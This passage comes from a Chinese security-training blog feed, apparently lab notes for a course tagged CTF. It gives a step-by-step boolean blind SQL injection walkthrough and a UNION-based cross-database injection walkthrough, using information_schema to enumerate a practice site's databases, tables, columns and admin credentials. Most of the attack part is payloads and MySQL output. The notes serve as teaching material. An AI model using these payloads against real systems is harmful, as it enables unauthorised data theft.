title="3、布尔盲注"></a>3、布尔盲注</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">布尔（<span class="hljs-type">Boolean</span>）型是计算机里的一种数据类型，只有<span class="hljs-literal">True</span>（真）和<span class="hljs-literal">False</span>（假）两个值。一般也称为逻辑型。<br> 页面在执行<span class="hljs-keyword">sql</span>语句后，只显示两种结果，这时可通过构造逻辑表达式的<span class="hljs-keyword">sql</span>语句来判断数据的具体内容。<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>布尔注入用到的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">mid(str,<span class="hljs-keyword">start</span>,length)  :字符串截取<br>ORD()                  :转换成ascii码<br>Length()               :统计长度<br>version()              :查看数据库版本<br>database()             :查看当前数据库名<br><span class="hljs-keyword">user</span>()                 :查看当前用户<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><h4 id="布尔注入流程："><a href="#布尔注入流程：" class="headerlink" title="布尔注入流程："></a>布尔注入流程：</h4><h5 id="猜解获取数据库长度"><a href="#猜解获取数据库长度" class="headerlink" title="猜解获取数据库长度"></a><strong>猜解获取数据库长度</strong></h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27; <span class="hljs-keyword">or</span> <span class="hljs-built_in">length</span>(database()) &gt; <span class="hljs-number">8</span> <span class="hljs-comment">--+    :符合条件返回正确，反之返回错误</span><br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a><strong>猜解数据库名</strong></h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;or</span> mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)= <span class="hljs-string">&#x27;z&#x27;</span> <span class="hljs-comment">--+    :因为需要验证的字符太多，所以转化为ascii码验证</span><br><span class="hljs-symbol">&#x27;or</span> ORD(mid(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">100</span> <span class="hljs-comment">--+ :通过确定ascii码，从而确定数据库名</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h5 id="猜解表的总数"><a href="#猜解表的总数" class="headerlink" title="猜解表的总数"></a><strong>猜解表的总数</strong></h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;or (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(TABLE_NAME) <span class="hljs-keyword">from</span> information_schema.TABLES <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()) = <span class="hljs-number">2</span>  --+   :判断表的总数<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="猜解第一个表名的长度"><a href="#猜解第一个表名的长度" class="headerlink" title="猜解第一个表名的长度"></a><strong>猜解第一个表名的长度</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-number">5</span> <span class="hljs-comment">--+ （第二个表）</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h5 id="猜解第一个表名"><a href="#猜解第一个表名" class="headerlink" title="猜解第一个表名"></a><strong>猜解第一个表名</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = &#x27;</span>a<span class="hljs-string">&#x27;  --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">Or</span> ORD(mid(<span class="hljs-keyword">select</span> <span class="hljs-built_in">TABLE_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> <br>TABLE_SCHEMA = <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt;<span class="hljs-number">100</span>   <span class="hljs-comment">--+</span><br><span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h5 id="猜解表的字段的总数"><a href="#猜解表的字段的总数" class="headerlink" title="猜解表的字段的总数"></a><strong>猜解表的字段的总数</strong></h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;or (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(column_name) <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">&#x27;表名&#x27;</span>) &gt; <span class="hljs-number">5</span> --+<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="猜解第一个字段的长度"><a href="#猜解第一个字段的长度" class="headerlink" title="猜解第一个字段的长度"></a><strong>猜解第一个字段的长度</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME=&#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1) = 10 --+</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-number">10</span> <span class="hljs-comment">--+ （第二个字段）</span><br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h5 id="猜解第一个字段名"><a href="#猜解第一个字段名" class="headerlink" title="猜解第一个字段名"></a><strong>猜解第一个字段名</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = &#x27;</span>表名<span class="hljs-string">&#x27; limit 0,1),1,1) = &#x27;</span>i<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">TABLE_NAME</span> = <span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">100</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><h5 id="猜解直接猜测字段名"><a href="#猜解直接猜测字段名" class="headerlink" title="猜解直接猜测字段名"></a><strong>猜解直接猜测字段名</strong></h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; or (<span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> information_schema.COLUMNS <span class="hljs-keyword">where</span> TABLE_NAME=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;username&#x27;</span> --+<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="猜解内容长度"><a href="#猜解内容长度" class="headerlink" title="猜解内容长度"></a><strong>猜解内容长度</strong></h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">假如已经知道字段名为  id   username password<br>&#x27;or (<span class="hljs-keyword">select</span> <span class="hljs-built_in">Length</span>(concat(username,<span class="hljs-string">&quot;---&quot;</span>,<span class="hljs-keyword">password</span>)) <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) = <span class="hljs-number">16</span>  --+<br><span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><h5 id="猜解内容"><a href="#猜解内容" class="headerlink" title="猜解内容"></a><strong>猜解内容</strong></h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;or mid((select concat(username,&quot;-----&quot;,password) from admin limit 0,1),1,1) = &#x27;</span>a<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> ORD(mid((<span class="hljs-keyword">select</span> concat(username,&quot;-----&quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">100</span> <span class="hljs-comment">--+    ASCII码猜解</span><br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><h5 id="也可以直接猜测内容"><a href="#也可以直接猜测内容" class="headerlink" title="也可以直接猜测内容"></a><strong>也可以直接猜测内容</strong></h5><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;or (<span class="hljs-keyword">Select</span> concat(username,<span class="hljs-string">&quot;-----&quot;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> admin <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> ) = <span class="hljs-string">&#x27;admin-----123456&#x27;</span>   --+<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day16（报错注入，延时、布尔盲注）</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小迪-day13(MySQL注入)</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day13(MySQL%E6%B3%A8%E5%85%A5)/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day13(MySQL%E6%B3%A8%E5%85%A5)/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/11/25/ED9khnGvJ6TjsWR.png" alt="mysql注入-小迪.png"></p><h3 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h3><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p><p>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><ul><li><strong>SCHEMATA****表</strong></li></ul><p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p><p>获取到数据库名称</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use information_schema;<br>mysql&gt; <span class="hljs-keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;<br>+--------------------+----------------------------+<br>| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |<br>+--------------------+----------------------------+<br>| information_schema | utf8                       |<br>| challenges         | gbk                        |<br>| mysql              | latin1                     |<br>| performance_schema | utf8                       |<br>| security           | gbk                        |<br>+--------------------+----------------------------+<br></code></pre></td></tr></table></figure><ul><li>TABLES 表</li></ul><p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables <span class="hljs-built_in">limit</span> 0,5;<br>+---------------+--------------------+---------------------------------------+<br>| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |<br>+---------------+--------------------+---------------------------------------+<br>| def           | information_schema | CHARACTER_SETS                        |<br>| def           | information_schema | COLLATIONS                            |<br>| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |<br>| def           | information_schema | COLUMNS                               |<br>| def           | information_schema | COLUMN_PRIVILEGES                     |<br>+---------------+--------------------+---------------------------------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><ul><li>COLUMNS 表</li></ul><p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;<br>+---------------+--------------------+----------------+<br>| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |<br>+---------------+--------------------+----------------+<br>| def           | information_schema | CHARACTER_SETS |<br>| def           | information_schema | CHARACTER_SETS |<br>| def           | information_schema | COLLATIONS     |<br>| def           | information_schema | COLLATIONS     |<br>| def           | information_schema | COLLATIONS     |<br>+---------------+--------------------+----------------+<br></code></pre></td></tr></table></figure><ul><li>USER_PRIVILEGES 表</li></ul><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SELECT * FROM USER_PRIVILEGES <span class="hljs-built_in">limit</span> 0,5;<br>+--------------------+---------------+----------------+--------------+<br>| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |<br>+--------------------+---------------+----------------+--------------+<br>| <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> | def           | SELECT         | YES          |<br>| <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> | def           | INSERT         | YES          |<br>| <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> | def           | UPDATE         | YES          |<br>| <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> | def           | DELETE         | YES          |<br>| <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> | def           | CREATE         | YES          |<br>+--------------------+---------------+----------------+--------------+<br>5 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><h3 id="二、跨库攻击"><a href="#二、跨库攻击" class="headerlink" title="二、跨库攻击"></a>二、跨库攻击</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">在同一个数据库管理系统中，<br>在一个数据库中存在某个<span class="hljs-keyword">sql</span>注入漏洞，并且权限为root，可以以此去操作另一个数据库<br>进行夸库攻击<br></code></pre></td></tr></table></figure><p>前提准备   （获取最高权限进行跨库攻击）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; create database book;<br>mysql&gt; use book;<br>mysql&gt; CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;<br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| book               |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>mysql&gt; use book;<br>mysql&gt; show tables;<br>+----------------+<br>| Tables_in_book |<br>+----------------+<br>| book           |<br>+----------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; desc book;<br>+-----------------+------------------+------+-----+---------+----------------+<br>| Field           | Type             | Null | Key | Default | Extra          |<br>+-----------------+------------------+------+-----+---------+----------------+<br>| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |<br>| book_title      | varchar(100)     | NO   |     | NULL    |                |<br>| book_author     | varchar(40)      | NO   |     | NULL    |                |<br>| submission_date | <span class="hljs-built_in">date</span>             | YES  |     | NULL    |                |<br>+-----------------+------------------+------+-----+---------+----------------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>打开网页进行查询当前数据库的用户</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span>user()<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/stzVK5AucI2LRSd.png" alt="img"><br>             可以看到当前用户为root拥有最高的权限。</p><p>获取到当前网页的数据库名<code>?id=-1%20union%20select%201,database(),3</code></p><p><img src="https://s2.loli.net/2022/11/25/dsBDoHtPSWACGMn.png" alt="img"></p><p>获取到当前网站的数据库是security</p><ul><li>常见的数据库与用户的对应关系</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">数据库A=网站A=数据库用户A——&gt;表名——&gt;列名——&gt;数据<br>数据库B=网站B=数据库用户B——&gt;表名——&gt;列名——&gt;数据<br>数据库C=网站C=数据库用户C——&gt;表名——&gt;列名——&gt;数据<br></code></pre></td></tr></table></figure><p><strong>备注：</strong>这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。</p><ul><li>在数据库中查询有哪些用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use mysql;<br>Database changed<br>mysql&gt; <span class="hljs-keyword">select</span> host,user,password from user;<br>+--------------+------+----------+<br>| host         | user | password |<br>+--------------+------+----------+<br>| localhost    | root |          |<br>| 2c8a2316583a | root |          |<br>| 127.0.0.1    | root |          |<br>| ::1          | root |          |<br>+--------------+------+----------+<br>4 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><p>在源码中查看使用的是哪一个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@2c8a2316583a:/var/www/html<span class="hljs-comment"># cat sql-connections/db-creds.inc</span><br>&lt;?php<br><br>//give your mysql connection username n password<br><span class="hljs-variable">$dbuser</span> =<span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$dbpass</span> =<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$dbname</span> =<span class="hljs-string">&quot;security&quot;</span>;<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$dbname1</span> = <span class="hljs-string">&quot;challenges&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security</p><p> 跨库查询的前提条件是必须<strong>高权限</strong>的用户才能执行跨库查询。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-variable">%20</span>union<span class="hljs-variable">%20</span><span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-punctuation">,</span>schema_name<span class="hljs-punctuation">,</span><span class="hljs-number">3</span><span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.schemata<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/4KhSxm3j7VgMTtz.png" alt="img"></p><p>数据库中执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SELECT * FROM <span class="hljs-built_in">users</span> WHERE <span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,schema_name,3 from information_schema.schemata LIMIT 0,1;<br>+----+--------------------+----------+<br>| <span class="hljs-built_in">id</span> | username           | password |<br>+----+--------------------+----------+<br>|  1 | information_schema | 3        |<br>+----+--------------------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><ul><li>1、获取到所有的数据库名称</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。  </p><p><img src="https://s2.loli.net/2022/11/25/yYGAPNhOX9oQ7MK.png" alt="img"></p><p>等同于在数据库中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use security;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>mysql&gt; SELECT * FROM <span class="hljs-built_in">users</span> WHERE <span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,group_concat(schema_name),3 from information_schema.schemata  LIMIT 0,1;<br>+----+----------------------------------------------------------------------+----------+<br>| <span class="hljs-built_in">id</span> | username                                                             | password |<br>+----+----------------------------------------------------------------------+----------+<br>|  1 | information_schema,book,challenges,mysql,performance_schema,security | 3        |<br>+----+----------------------------------------------------------------------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><ul><li>2、指定获取book库中的表名信息</li></ul><p><img src="https://s2.loli.net/2022/11/25/RwEG42nazi6VHtQ.png" alt="img"><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;book&#39;</code></p><p>等同于在数据库中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SELECT * FROM <span class="hljs-built_in">users</span> WHERE <span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,group_concat(table_name),3 from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">&#x27;book&#x27;</span>  LIMIT 0,1;<br>+----+----------+----------+<br>| <span class="hljs-built_in">id</span> | username | password |<br>+----+----------+----------+<br>|  1 | book     | 3        |<br>+----+----------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><ul><li>3、获取指定数据库book下的book表的列名信息</li></ul><p><img src="https://s2.loli.net/2022/11/25/Tm2M95lzIoZKcaU.png" alt="img"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;book&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;book&#x27;</span><br></code></pre></td></tr></table></figure><p>等同于以下的数据库命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use security;<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with 